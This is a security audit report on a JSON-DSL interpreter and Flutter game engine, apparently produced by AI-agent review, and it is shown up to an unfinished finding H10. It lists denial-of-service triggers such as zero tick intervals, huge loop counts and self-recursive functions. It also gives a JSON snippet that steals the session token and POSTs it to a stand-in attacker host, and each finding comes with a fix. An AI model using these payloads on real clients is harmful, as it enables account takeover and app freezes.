# 解释器与游戏解释子系统：设计缺陷与漏洞审查报告

> **审查日期**：2026-06-18  
> **代码基线**：`feat/agent-control-plane` @ `f86646d`（当前最新代码）。本报告所有行号以该提交为准；请在此分支上对照阅读。  
> **范围**：JSON-DSL 解释器与游戏解释（game interpretation）全部关联代码 —— `lib/json_ui/interpreter.dart`、`lib/games/*`、游戏控件 glue、网络/依赖/缓存层、`launcher_bridges`、`visual_primitives`、`rive`（约 16k 行）  
> **方法**：多智能体定向审查（10 个 finder）→ 对每条 finding 做**对抗式验证**（默认尝试驳回）→ 完整性批判找盲区 → 第二轮补审漏审文件。两轮合计 **111 个 agent、~3.4M token、94 条原始发现 → 64 条经验证确认、30 条被驳回**。报告作者另对 5 条头部链路做了独立人工复核。  
> **状态**：本文件为审查结论，**待人工审阅**。所有结论基于实际代码与行号；触发用例为最小可复现 JSON 片段。

---

## 1. 威胁模型

依据 `CLAUDE.md` 的「框架稳定性原则」与平台架构：**JSON App（DSL v3.3）由 AI 或最终用户编写、在运行时加载进单一预编译 Flutter 客户端，属不可信输入**。攻击者可完全控制 JSON 配置、它触发的任意 HTTP 响应、它声明的 Registry 依赖、以及它加载的游戏/Tiled 地图数据。

安全承诺是「**预编译客户端能力边界**」：不可信 JSON 只能做已注册控件 / 内置函数**有意允许**的事。本报告将「缺陷」定义为不可信 JSON（或其拉取的数据）突破该边界的任意路径，分为五类边界 + 通用设计缺陷：

| 边界 | 含义 |
|------|------|
| **A 沙箱逃逸** | 执行原生/任意代码、触达未暴露能力、滥用 jsonlogic 算子越权 |
| **B 拒绝服务** | 无界递归/循环、内存/句柄耗尽、永不取消的定时器 |
| **C SSRF/外泄** | 请求内网/loopback/元数据主机、向攻击者主机泄露 token/cookie、跟随重定向 |
| **D 宿主访问** | 路径穿越、任意文件/资源读写、缺少完整性校验 |
| **E 跨应用状态破坏** | 一个应用污染另一个应用状态、跨应用边界的注册/定时器泄漏 |
| **设计** | 生命周期泄漏、异步竞态、对畸形 JSON 的类型崩溃、契约漂移 |

---

## 2. 执行摘要

经对抗式验证确认 **64 条**问题：

- 🔴 **严重 (Critical)：3**
- 🟠 **高危 (High)：14**
- 🟡 **中危 (Medium)：28**
- ⚪ **低危 (Low)：19**

按类别分布：拒绝服务(DoS) 26，SSRF/数据外泄 10，类型/崩溃 8，设计缺陷 6，竞态 5，宿主访问 4，状态破坏 4，契约不一致 1。

### 系统性根因（比单条 bug 更值得修复）

几乎所有高/严重问题都归因于 4 个架构层面的缺失：

1. **能力边界形同虚设：高权限内置函数无任何授权门槛。** `@get_auth_token` 直接把登录态 Bearer token 交给任意 JSON，`@http_*` 可请求任意主机且无 allowlist —— 任何被用户运行的 JSON App 都能静默窃取 token 外发。**这是最严重的设计缺陷（见 C1）。**
2. **缺乏统一的「不可信输入消毒层」。** URL、文件名、包名、数值、循环次数从 JSON 直达 sink（`dio`、`writeStringAbs`、`for` 循环、除法、`String*count`），各处各自为政 —— 绝大多数 DoS / 路径穿越 / SSRF 均源于此。
3. **单解释器多应用模型的状态隔离不完整。** `pushState/popState` 漏存 flame handler 列表、`_activeModalCount`、生命周期监听、未取消的 `@delay`/Timer —— 子应用可污染父应用状态（边界 E）。
4. **执行无「深度/数量/时间」上限。** 函数递归、`@launch_app` 嵌套、`@loop_by_num`、tick interval、实体/音频生成均无 cap —— 纯 JSON 即可挂死或 OOM 客户端。

> **注**：`CLAUDE.md` 第 2 条「框架稳定性原则」明确要求「框架应能处理任意合法 JSON 数据……如果某种数据导致框架崩溃，说明框架设计有缺陷需要修复」。本报告中所有 `type-crash` / `dos` 类问题都是对该原则的直接违反。

---

## 3. 详细发现

> 每条含：ID、类别、边界、置信度、机制、**最小触发用例**、影响、修复建议、以及对抗验证者的核验结论。

### 严重 (Critical)

#### `C1` — Tick-loop interval of 0 or negative causes a hard infinite loop (frame hang)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/flame_game_engine.dart:182-188`

**机制**：In update(dt) the tick catch-up loop is `while (t.accumulator >= iv && !isGameOver)`. The interval is computed as `(logic.resolveExpression(t.intervalSpec) as num?)?.toDouble() ?? 0.16`. The `?? 0.16` fallback only triggers when the value is null. If the JSON-supplied interval resolves to 0 or any negative number, `as num?` succeeds, `.toDouble()` yields 0/-1 (not null), so the fallback is skipped. With iv <= 0, `t.accumulator -= iv` never decreases the accumulator (or increases it), so `t.accumulator >= iv` stays true forever and the loop runs `logic.runLogic(t.logic)` an unbounded number of times within a single frame, never returning to the event loop. isGameOver cannot become true because the only code that could set it is the logic body that may never finish executing the loop.

**触发用例**：

```
{"type":"flame_game","world":{},"tick":{"interval":0,"logic":[{"call":"@set","args":{"target":"vars.x","value":1}}]}} — mounting this flame_game widget freezes the app once onGameResize gives a valid canvas size (_ready=true). interval:-1 hangs identically; "{{ vars.bad }}" where vars.bad==0 also hangs since resolveExpression returns the num 0, defeating the ?? 0.16 fallback.
```

**影响**：Single malicious/AI-authored game config permanently freezes the UI isolate (ANR / unresponsive app) the moment the game becomes _ready. No recovery without killing the app.

**修复建议**：Clamp the resolved interval to a sane minimum, e.g. `final iv = math.max(1/240, (... as num?)?.toDouble() ?? 0.16); if (!iv.isFinite || iv <= 0) iv = 0.16;` and also bound the number of catch-up iterations per frame (e.g. `for (int n=0; n<8 && t.accumulator>=iv && !isGameOver; n++)`).

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable from untrusted JSON. Traced end-to-end:

1. UNTRUSTED INPUT REACHES intervalSpec UNVALIDATED. In _setupFromSpec (flame_game_engine.dart:437-455), tick.interval is read directly into _TickLoop.intervalSpec from the raw JSON map — both the single-Map form (line 441) and the List form (line 450). No range/positivity check at parse time.

2. THE ?? FALLBACK ONLY CATCHES null, NOT zero/negative. At line 182-183: `final iv = (logic.resolveExpression(t.intervalSpec) as num?)?.toDouble() ?? 0.16;`. I verified GameLogicEngine.resolveExpression (game_logic.dart:198-220): for a literal JSON num like 0 it falls through to `return raw` (line 219), yielding 0 (non-null)。…

</details>

---

#### `C2` — scroll_list with row_height <= 0 (or NaN) spins an unbounded row-spawn loop

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_entity.dart:683-718`

**机制**：ScrollListEntity.update runs `while (_needsSpawn(world)) { _spawnAtTop(world); }`. rowHeight is taken from the JSON `row_height` with no positivity check (flame_game_engine.dart line 784-786). With rowHeight == 0 (or negative), _spawnAtTop computes newY = rows.first.y - rowHeight = rows.first.y (unchanged) and inserts a new row at the same Y. _needsSpawn (`rows.first.y > -rowHeight*4` == `> 0`) stays true, so the loop spawns rows forever, growing `rows` without bound each frame.

**触发用例**：

```
Game DSL entity: {"kind":"scroll_list","row_height":0,"row_spec":{"cells":4}}. With a normally laid-out canvas (gameWorld.width/height > 0) this hangs FIRST in the build-time pre-fill loop at flame_game_engine.dart:791-803 (`while (y < gameWorld.height + rowHeight)` with `y += rowHeight==0` never terminating, unbounded rows.add). If the entity is instead built before layout (width/height == 0, rows starts empty), the cited update loop at game_entity.dart:683-685 becomes the live infinite loop on the first frame after the world is sized. Either path is reachable purely from untrusted config; root cause is the missing positivity/finiteness check at flame_game_engine.dart:784-786.
```

**影响**：Infinite loop + unbounded List growth on the very first update tick: instant frame hang and rapid OOM. Triggerable purely from untrusted entity config.

**修复建议**：Reject/clamp rowHeight to a positive minimum when building the entity (`rowHeight = rowHeight.isFinite && rowHeight > 0 ? rowHeight : default`), and add an iteration cap inside the spawn while-loop.

<details><summary>对抗验证者核验结论</summary>

The mechanism is real and reachable from fully untrusted game DSL. _buildEntity (flame_game_engine.dart:539) is called with the raw entity spec (517) from the untrusted game config; for kind 'scroll_list' the row_height is read as `(spec['row_height'] as num?)?.toDouble()` at lines 784-786 with NO positivity or finiteness check. rowHeight then flows unguarded into ScrollListEntity.

Traced both unbounded loops with rowHeight == 0:
- update loop (cited, game_entity.dart:683-685): `while (_needsSpawn(world)) _spawnAtTop(world);`. _needsSpawn (688-696) for default direction 'down' returns `rows.first.y > -rowHeight*4` == `rows.first.y > 0`. _spawnAtTop (698-718) computes `newY = rows.first.y - 。…

</details>

---

#### `C3` — @get_auth_token exposes the live session bearer to untrusted JSON with no gating, enabling silent exfiltration via @http_* to any attacker host

**类别**：SSRF/数据外泄 · **边界**：C · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:2441-2447 (token source); 2965-2987 (@http_get/@http_post)`

**机制**：@get_auth_token (interpreter.dart:2441-2447) returns AuthService.token directly to the JSON-DSL runtime. AuthService.token (auth_service.dart:78) returns _accessToken, the real Supabase session access token persisted under SharedPreferences key 'auth_access_token' (auth_service.dart:23,84). The builtin performs NO gating: no app-permission check, no user consent, not even an @is_logged_in precondition — any untrusted JSON App can bind the bearer to a variable. The @http_* builtins (_builtinHttpGet 2965, _builtinHttpPost 2974, plus put/patch/delete/head/options/sse 2989-3116) take a fully attacker-controlled 'url' string and arbitrary attacker-controlled 'headers' map (_toStringMap), passing them straight to DslHttpClient. _resolveUrl (http_client.dart:26-35) applies NO host/scheme allowlist: any value with a scheme (uri.hasScheme, line 30) is used verbatim, so https://evil.attacker.com is accepted. The shared Dio instance (http_client.dart:16-24) sets no maxRedirects/followRedirects override, so it follows redirects by default. Net effect: untrusted JSON reads the logged-in user's auth token and POSTs it to an arbitrary external host. This breaks the core 'precompiled client capability boundary' promise: a capability (holding the session token) that should never be reachable from declarative JSON is fully reachable.

**触发用例**：

```
Startup steps in a malicious JSON App:
[
  {"action":"@get_auth_token","args":{"bind":"global.tok"}},
  {"action":"@http_post","args":{
     "url":"https://evil.attacker.com/collect",
     "headers":{"Authorization":"Bearer {{ global.tok }}"},
     "body":{"token":"{{ global.tok }}"}
  }}
]
@get_auth_token (interpreter.dart:2441) -> AuthService.token (auth_service.dart:78) binds the live access token; @http_post (interpreter.dart:2974 -> _builtinHttpPost) -> _toStringMap (3787, no sanitization) -> DslHttpClient.post -> _resolveUrl (http_client.dart:30 accepts scheme'd URL verbatim, no allowlist). Direct POST to attacker host succeeds; no redirect needed for the primary vector.
```

**影响**：Full account takeover: the exfiltrated bearer is a valid Supabase access token that an attacker can replay against the backend (IM, profile, registry, storage) as the victim until expiry/refresh. @get_user_info concurrently leaks PII (email, username). Because any market/AI-generated JSON App can do this on load, a single published malicious app silently harvests every runner's session token.

**修复建议**：Defense in depth: (1) Gate @get_auth_token behind an explicit, per-app, user-granted permission, or remove direct token exposure entirely and instead attach auth only to first-party backend requests via a Dio interceptor that injects the bearer ONLY when the resolved host is in a backend allowlist. (2) Add a host/scheme allowlist in _resolveUrl (http_client.dart) — reject non-allowlisted external hosts for any request that could carry credentials, and reject loopback/internal ranges. (3) Strip/deny attacker-supplied Authorization/Cookie headers in _toStringMap unless the target host is trusted. (4) Set followRedirects=false (or maxRedirects=0) for credentialed requests so a trusted-host call cannot 30x-bounce the bearer to an attacker host.

<details><summary>对抗验证者核验结论</summary>

Every link in the exfiltration chain is real and traced from untrusted JSON to impact, with no missed guard.

1. Token source (interpreter.dart:2441-2447): `@get_auth_token` returns `AuthService.token` directly to the DSL runtime with zero gating — no per-app permission, no consent, no `@is_logged_in` precondition. Verified `AuthService.token` (auth_service.dart:78) returns `_accessToken`, the real session access token persisted under SharedPreferences key 'auth_access_token' (lines 23, 84). It is bound to a variable via `setVariable(tokenBind, token)`.

2. Reachability: Both `@get_auth_token` (case at 2441) and `@http_post` (case at 1573 -> `_builtinHttpPost`) are dispatched by the central 。…

</details>

---

### 高危 (High)

#### `H1` — value_grid cols/rows unbounded → multiplicative memory allocation

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/flame_game_engine.dart:583-609`

**机制**：For kind 'value_grid', cols and rows are read straight from JSON with no upper bound and the builder eagerly allocates a cols*rows matrix: `for r in rows { for c in cols { row.add(v) } }`. There is no cap on entity count nor on grid dimensions anywhere in the engine. This runs during _resetGameState (first onGameResize), so it fires automatically on load.

**触发用例**：

```
flame_game widget with entities: {"g":{"kind":"value_grid","cols":100000,"rows":100000,"render":{}}} — auto-builds on first onGameResize via _resetGameState→_buildEntity, attempting ~10^10 int allocation. Also reachable dynamically via @spawn → spawnEntity → _buildEntity. Moderate 5000x5000 reliably hangs the main thread for seconds.
```

**影响**：Allocation blowup / OutOfMemory crash of the client from a single entity declaration; even moderate values (e.g. 5000x5000) cause a multi-second hang plus large heap spike.

**修复建议**：Clamp cols and rows to a small ceiling (e.g. <= 256 each) and reject grids whose cols*rows exceeds a fixed budget; similarly cap total entity count when building entities and on @spawn.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable from untrusted JSON. In /home/fish/ai-app/lib/games/flame_game_engine.dart the `value_grid` branch of `_buildEntity` (lines 583-609) reads `cols = (spec['cols'] as num?)?.toInt() ?? 4` and `rows = (spec['rows'] as num?)?.toInt() ?? 4` with NO clamp/cap, then runs nested loops `for r<rows { row=[]; for c<cols { row.add(v) } cells.add(row) }` (lines 588-601), eagerly allocating a rows×cols int matrix, also retained in ValueGridEntity (game_entity.dart ~line 800). I traced the untrusted path: JsonFlameGameWidget (lib/json_ui/widgets/flame_game_widget.dart:31-32, 148-149) passes the JSON spec verbatim as `spec:` to JsonFlameGame; `_resetGameState` (lines 493-522) 。…

</details>

---

#### `H2` — No cap on entity count or @spawn — entity-map / image-cache flooding

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：medium  
**位置**：`lib/games/flame_game_engine.dart:372-382`

**机制**：spawnEntity adds to the `entities` map with no size limit, and _resetGameState builds every entity in spec['entities'] with no count cap. update() iterates all entities every frame, and render() additionally does `entities.values.toList()..sort(...)` every frame — O(n log n) per frame proportional to attacker-controlled n. Each distinct sprite asset is also stored permanently in `_imageCache` (line 65/1021) which is never evicted, so a spawner that creates entities with unique asset URLs grows both the entity set and the image cache without bound and issues unbounded asset loads via assetManager.

**触发用例**：

```
Load a flame_game JSON App with a tick loop that spawns a uniquely-id'd entity every tick:
{
  "vars": { "n": 0 },
  "tick": { "interval": 0.016, "logic": [
    { "call": "@set", "args": { "var": "n", "value": { "+": [ {"var":"vars.n"}, 1 ] } } },
    { "call": "@spawn", "args": { "id": "e_{{ vars.n }}", "kind": "pixel", "position": [0,0], "size": [2,2], "render": { "asset": "https://attacker.example/{{ vars.n }}.png" } } }
  ] }
}
The fresh id ("e_0","e_1",...) bypasses the containsKey dedup at line 373, so the entities map grows ~60 entries/sec; render()'s per-frame O(n log n) sort (line 226) and update()'s O(n) loop degrade frame rate, while the unique asset path inflates _imageCache and issues one assetManager.loadBytes per tick. Within seconds tens of thousands of entries accumulate. Omit the asset for a pure entity/CPU DoS without network amplification.
```

**影响**：Per-frame work and memory grow without bound → frame-rate collapse and OOM; unique-asset spawning also amplifies into many network/storage requests.

**修复建议**：Enforce a hard maximum entity count (reject spawn / drop oldest beyond the cap), bound _imageCache size with LRU eviction, and avoid re-sorting the full list every frame when entity count is large.

<details><summary>对抗验证者核验结论</summary>

I traced the full path from untrusted JSON to impact and the mechanism is real, not a misread.

1) spawnEntity (flame_game_engine.dart:372-382) adds to the unbounded `entities` map. The only guard is `if (entities.containsKey(id)) return false;` (line 373) which merely dedups identical ids — it does NOT cap total count. There is no maxEntities / count check anywhere in the file (grep for entities.length / maxEntities / cap returns nothing).

2) Reachability is confirmed: `@spawn` is a real action (game_actions.dart:536-543) dispatched via GameActions.dispatch from game_logic.dart:116. Tick logic runs every frame in update() (flame_game_engine.dart:178-188), and args are template-resolved bef。…

</details>

---

#### `H3` — Looping audio players accumulate without bound (per-id, never removed) — memory/handle exhaustion

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_audio.dart:38-42`

**机制**：play() with shouldLoop==true does `_loopingPlayers.putIfAbsent(idOrSource, AudioPlayer.new)`. The key is the raw id-or-source string supplied by the JSON App, and looping players are only ever disposed in dispose() (controller teardown) — there is no eviction or cap. An attacker who calls @audio.play with a fresh id every frame creates a new native AudioPlayer per distinct id that lives until the game is torn down. play() also accepts any unknown id by synthesizing `_AudioSpec(source: idOrSource)`, so the id need not be in the catalog.

**触发用例**：

```
"frame": { "logic": [ { "call": "@audio.play", "args": { "id": "loop_{{ vars.frame }}", "loop": true } }, { "call": "@set", "args": { "var": "vars.frame", "value": { "+": [ {"var":"vars.frame"}, 1 ] } } } ] } — each frame mints a new looping AudioPlayer that is never freed.
```

**影响**：Unbounded native audio player / file-handle / memory growth leading to OOM or audio subsystem exhaustion; concurrent looping playback flood.

**修复建议**：Cap the number of concurrent looping players (e.g. reject or LRU-evict beyond N), only allow ids that exist in the configured catalog, and stop+dispose evicted players.

<details><summary>对抗验证者核验结论</summary>

Verified the full path from untrusted JSON to unbounded native AudioPlayer growth.

Mechanism (real, not a misread):
- game_audio.dart:39 `_loopingPlayers.putIfAbsent(idOrSource, AudioPlayer.new)` keys the map by the raw id/source string supplied by JSON, creating a new native AudioPlayer for each distinct key.
- game_audio.dart:34 falls back to `_AudioSpec(source: idOrSource)` for any unknown id, so the id need NOT exist in the configured catalog — arbitrary fresh ids are accepted.
- No cap/eviction exists anywhere: grep for length>/cap/evict/maxPlayers in game_audio.dart returns nothing. `_loopingPlayers` is cleared ONLY in dispose() (lines 112-115), which flame_game_engine.dart invokes on。…

</details>

---

#### `H4` — @while iteration cap is fully attacker-controlled (no upper clamp) — per-frame freeze / client DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_logic.dart:156-169`

**机制**：_doWhile reads max_iterations directly from JSON args with `(rawArgs['max_iterations'] as num?)?.toInt() ?? 10000` and uses it as the only loop bound. There is no enforced upper limit. The body re-evaluates cond each iteration but nothing stops an attacker from supplying a gigantic cap and a cond that stays truthy. Because frame.logic and tick.logic run this engine every single frame (flame_game_engine.dart update() lines 174,186), a single @while with a huge cap executes synchronously on the UI/game thread and never yields, hard-freezing the app.

**触发用例**：

```
flame_game spec: "frame": { "logic": [ { "call": "@while", "args": { "cond": true, "body": [ {"call":"@noop"} ], "max_iterations": 1000000000 } } ] }. Loaded via flame_game_engine.dart:432-433 into _frameLogic, executed by update() at line 174 on the first frame -> _doWhile (game_logic.dart:156-169) spins 1e9 synchronous iterations -> UI thread freeze. The same applies to tick.logic (update() line 186).
```

**影响**：Untrusted JSON App freezes the precompiled client (UI thread blocked indefinitely / ANR). Trivial to author.

**修复建议**：Clamp max_iterations to a hard ceiling (e.g. min(requested, 100000)) and additionally bound total per-frame logic work (a global step/iteration budget per update() that aborts the whole frame's logic when exceeded).

<details><summary>对抗验证者核验结论</summary>

The finding is accurate after reading the actual code. /home/fish/ai-app/lib/games/game_logic.dart:159 reads `final maxIter = (rawArgs['max_iterations'] as num?)?.toInt() ?? 10000;` and the loop at 163-168 (`while (count < maxIter)`) uses it as the only bound — there is no upper clamp. An attacker-supplied value (e.g. 1e9) is used verbatim. runLogic (line 37) executes steps synchronously with no global per-frame iteration/step budget; I confirmed there is no budget guard anywhere in the dispatch path. The @while dispatch is reachable at runAction (line 83-84). The trigger path from untrusted JSON is complete and real: flame_game spec['frame']['logic'] is loaded into _frameLogic at flame_game。…

</details>

---

#### `H5` — @loop_by_num count is unbounded — per-frame freeze / client DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/games/game_logic.dart:174-183`

**机制**：_doLoopByNum computes `count` from resolveExpression(rawArgs['count']).toInt() with no upper bound, then runs the body that many times synchronously. Combined with the per-frame execution of frame/tick logic, a large count blocks the game loop. Nesting two @loop_by_num gives quadratic blowup with no guard.

**触发用例**：

```
"frame": { "logic": [ { "call": "@loop_by_num", "args": { "count": 500000000, "body": [ {"call":"@noop"} ] } } ] }. Or nest two of them with count 100000 each for 1e10 work.
```

**影响**：Client hard-freeze every frame; trivially authorable by untrusted JSON.

**修复建议**：Clamp count to a sane ceiling and share a per-frame iteration/step budget across @while/@loop_by_num/@for_each_entity so total work per update() is bounded.

<details><summary>对抗验证者核验结论</summary>

Mechanism is real and reachable. In /home/fish/ai-app/lib/games/game_logic.dart:174-183, `_doLoopByNum` reads `count` from `resolveExpression(rawArgs['count'])` and loops `for (int i = 0; i < count; i++)` with NO upper bound and no shared per-frame budget. Contrast its sibling `_doWhile` at line 156-168, which explicitly caps at `max_iterations` (default 10000, comment at line 155 says "兜底防死循环"). The complete absence of any equivalent cap on @loop_by_num is a clear oversight, not a design choice, which strengthens the finding.

Reachability: flame_game is a JSON-registered widget (CLAUDE.md). flame_game_engine.dart:171-176 runs `_frameLogic` synchronously every frame inside `update(dt)` with。…

</details>

---

#### `H6` — @loop_by_num has no iteration cap — unbounded loop DoS

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:2906-2922`

**机制**：_builtinLoopByNum reads `count` from args (template-resolved) and loops `for (var i=0;i<count;i++)` with NO upper bound, awaiting the body each iteration. This is in stark contrast to _builtinWhile (line 2869) which deliberately defaults max_iterations to 10000. A large `count` (or one derived from an attacker-controlled HTTP response via template) freezes the UI isolate indefinitely and grows the loop context stack churn. Each iteration also pushes/pops _loopContextStack and runs notifyListeners-triggering steps, amplifying cost.

**触发用例**：

```
`{"call":"@loop_by_num","args":{"count":1000000000,"body":[{"call":"@set","args":{"var":"global.x","value":{"+":[{"var":"global.x"},1]}}}]}}` — or `"count":"{{ global.httpResp.total }}"` where total comes from an attacker server.
```

**影响**：Hard client hang / effective denial of service of the precompiled client from pure JSON config or attacker-controlled response data.

**修复建议**：Apply the same cap pattern as @while: clamp count to a sane maximum (e.g. min(count, 100000)) or accept an explicit max and default-cap it; abort with a logged warning when exceeded.

<details><summary>对抗验证者核验结论</summary>

Verified against the actual code. _builtinLoopByNum at /home/fish/ai-app/lib/json_ui/interpreter.dart:2906-2922 reads `count` via `_toInt(_resolveTemplatesInRule(args['count']) ?? 0)` and runs `for (var i = 0; i < count; i++)` awaiting the body each iteration, with NO upper bound, no clamp, and no try-catch. The cited contrast with _builtinWhile (lines 2866-2883, which defaults max_iterations to 10000) is accurate. _toInt (lines 3756-3761) parses int/double/String with no clamping, so an attacker-supplied literal (1000000000) or template-resolved value from an HTTP response flows straight into the loop bound. The builtin is reachable from any JSON step via the dispatch switch at line 1262 (`。…

</details>

---

#### `H7` — Unbounded recursion via self-/mutually-recursive custom functions (@global.fn) → stack overflow

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:3627-3672 (_executeGlobalFunction / _executeFunctionDef), reached from _executeCall:1288-1290`

**机制**：Custom global functions execute their `logic` steps via `_executeStep` → `_executeCall`, which can call `@global.<self>` again. There is NO call-depth counter anywhere in the dispatch path (grep confirms no _callDepth/recursion guard). A function that calls itself (directly or via a mutual A→B→A chain) recurses without bound. Each level also pushes onto `_paramsStack`, so memory grows too. Because executeSteps()/executeAction() are async, the stack overflow / OOM is reached on the platform thread and either crashes the isolate or produces a StackOverflowError that the generic catch routes to the crash page — but for deep async chains it can wedge the app first.

**触发用例**：

```
global.functions = { "boom": { "params": [], "logic": [ { "call": "@global.boom" } ] } }; then a startup step or button action { "call": "@global.boom" }. Outcome: infinite async self-recursion — _paramsStack grows one Map per level without bound (OOM) and the call never returns (app wedge), rather than a synchronous StackOverflowError. Mutual variant f→g→f behaves identically.
```

**影响**：Untrusted JSON App reliably crashes/hangs the single precompiled client (StackOverflowError or unbounded _paramsStack growth → OOM). Denial of service of the whole client.

**修复建议**：Add an instance call-depth counter incremented in _executeFunctionDef (and ideally _executeCall) with a hard cap (e.g. 256); throw a controlled DSL error when exceeded so @try_catch / crash page can handle it instead of a native stack overflow.

<details><summary>对抗验证者核验结论</summary>

I traced the full path from untrusted JSON to impact and it is real and reachable. `_executeStep` (interpreter.dart:1222) dispatches `call` to `_executeCall` (1248). For `@global.boom`, line 1288-1290 calls `_executeGlobalFunction` (3627) → `_executeFunctionDef` (3649), which pushes onto `_paramsStack` (3660) and loops over `logic`, re-entering `_executeStep` (3666). A function whose logic is `[{ "call": "@global.boom" }]` re-enters itself with no termination. I grepped for `_callDepth`, `callDepth`, `recursion`, `StackOverflow`, `maxDepth`, `_depth` across interpreter.dart and found NONE — there is no depth counter, cap, or recursion guard anywhere in the dispatch path. The reviewer did not。…

</details>

---

#### `H8` — @loop_by_num has no iteration cap — attacker-controlled count blocks the UI thread / OOMs

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/interpreter.dart:2906-2922 (_builtinLoopByNum)`

**机制**：`count` is taken straight from the JSON args (`_toInt(_resolveTemplatesInRule(args['count']) ?? 0)`) and the loop runs `for (var i = 0; i < count; i++)` with no upper bound — unlike `@while` which at least has a (weak) `max_iterations`. The loop body is awaited per-iteration but a body of pure synchronous builtins (e.g. @set/@list_add) yields no real suspension point, so a huge count freezes the event loop and grows _variables without limit.

**触发用例**：

```
{ "call": "@loop_by_num", "args": { "count": 1000000000, "body": [ { "call": "@list_add", "args": { "var": "global.x", "item": 1 } } ] } } — confirmed reachable: _executeCall:1262 dispatches @loop_by_num to _builtinLoopByNum:2906, count resolved with no bound. The @list_add body (interpreter.dart:1645, List.from(current)..add(item)) makes it O(N^2) memory → OOM; even with a no-op body the unbounded await-microtask loop starves rendering/input → UI hang. Note: Dart's await does yield a microtask each iteration, so it is microtask starvation rather than a hard event-loop freeze, but the user-visible effect (unresponsive client / OOM) holds.
```

**影响**：Untrusted JSON App hangs the client indefinitely and/or exhausts memory (each @list_add copies the growing list → quadratic blowup). DoS of the whole client.

**修复建议**：Clamp count to a sane maximum (e.g. 100000) or apply the same max_iterations guard as @while; consider a global per-run step budget shared across all control-flow builtins.

<details><summary>对抗验证者核验结论</summary>

Verified against the actual code. `_builtinLoopByNum` at /home/fish/ai-app/lib/json_ui/interpreter.dart:2906-2922 reads `count` straight from JSON args via `_toInt(_resolveTemplatesInRule(args['count']) ?? 0)` and runs `for (var i = 0; i < count; i++)` with NO upper bound. Dispatch is reachable from untrusted JSON: `_executeCall` (line 1262-1263) routes `@loop_by_num` directly to this builtin, and control-flow actions intentionally bypass the generic `_resolveArgs` but `count` is still resolved and converted, so `count: 1000000000` is honored.

Guard check: there is no global step budget, timer, or iteration counter anywhere in `_executeStep` (line 1222) or `_executeCall` (line 1248). By con。…

</details>

---

#### `H9` — @launch_app has no cap on _stateStack depth / nesting — recursive or mutual @launch_app exhausts state stack and navigator routes (DoS)

**类别**：拒绝服务(DoS) · **边界**：B · **置信度**：high  
**位置**：`lib/json_ui/builtins/launcher_bridges.dart:215-343`

**机制**：_launchApp pushes a full state snapshot (pushState) and a MaterialPageRoute for every launch, with no depth guard. interpreter.dart:166 declares _stateStack with an explicit comment that pushState/popState pairing is unchecked and there is no cap. A child app whose startup steps (executeSteps, awaited at line 314 before the route exists) call @launch_app again — pointing at itself or a mutually-recursive partner — drives unbounded pushState calls, each cloning the entire variables/functions/controllers maps and the loop/params/event stacks (deep List/Map copies in pushState 629-647), plus unbounded MaterialPageRoute pushes. Because the recursive @launch_app runs inside executeSteps BEFORE the parent's route push, the recursion can run synchronously deep before any frame is shown.

**触发用例**：

```
self.json startup steps: {"steps":[{"call":"@launch_app","args":{"kind":"local","fileName":"self.json"}}]}. Each level: _launchApp (launcher_bridges.dart:311-314) pushState + loadConfig(self) + await executeSteps → _executeStep(@launch_app) → recurse. Because each level awaits async loads it does not blow the native call stack but grows _stateStack and the microtask chain unboundedly, with pushState (interpreter.dart:636-644) deep-cloning nav history + controllers + focus nodes + loop/params/event stacks every level → heap exhaustion before any route is pushed (line 328 never reached). Mutual variant: a.json startup launches b.json (kind local), b.json startup launches a.json.
```

**影响**：Memory exhaustion from unbounded snapshot clones + navigator route stack growth; app hang/crash. Untrusted JSON triggers it with a few lines.

**修复建议**：Cap _stateStack depth (e.g. <= 8) in pushState/_launchApp and refuse @launch_app when isNested depth exceeds the cap or when re-entered during executeSteps; detect self/cycle by appId.

<details><summary>对抗验证者核验结论</summary>

Verified against source. The mechanism is real and there is NO guard. /home/fish/ai-app/lib/json_ui/builtins/launcher_bridges.dart:311-319: _launchApp calls interpreter.pushState() then loadConfig(config) then `await interpreter.executeSteps()` BEFORE the route is pushed at line 328. executeSteps (interpreter.dart:724-745) runs the child config's `steps` in a plain loop via _executeStep, and @launch_app is a registered builtin (launcher_bridges.dart:50-53) callable from steps with no gating. So a child app whose startup steps call @launch_app on itself (or a→b→a mutual pair) recurses: _launchApp→pushState→loadConfig→executeSteps→@launch_app→pushState... interpreter.dart:166 declares `final L。…

</details>

---

#### `H10` — Path traversal in dependency cache write via attacker-controlled dependency name

**类别**：宿主访问 · **边界**：D · **置信度**：high  
**位置**：`lib/json_ui/cache_manager.dart:230-235`

**机制**：_downloadAndCacheResource builds the local cache path by direct string interpolation: relPath = '${type=="app"?"apps":"packages"}/$name/$resolvedVersionStr.json', then writes via NativeFs.writeStringAbs('$_cacheDir/$relPath', ...). `name` originates from the untrusted JSON App's `dependencies` map keys (DependencySpec.fromJson is called with entry.key in dependency_loader.dart:130 and passed straight into getResource at dependency_loader.dart:165-168). Neither `name` nor `resolvedVersionStr` (which comes from the registry response field `data['version']`, also untrusted) is sanitized for path separators or `..`. NativeFs.writeStringAbs (native_fs_io.dart:67-76) calls f.parent.createSync(recursive:true) and writeAsString with no path containment check, so `..` segments resolve outside the cache dir.

**触发用例**：

```
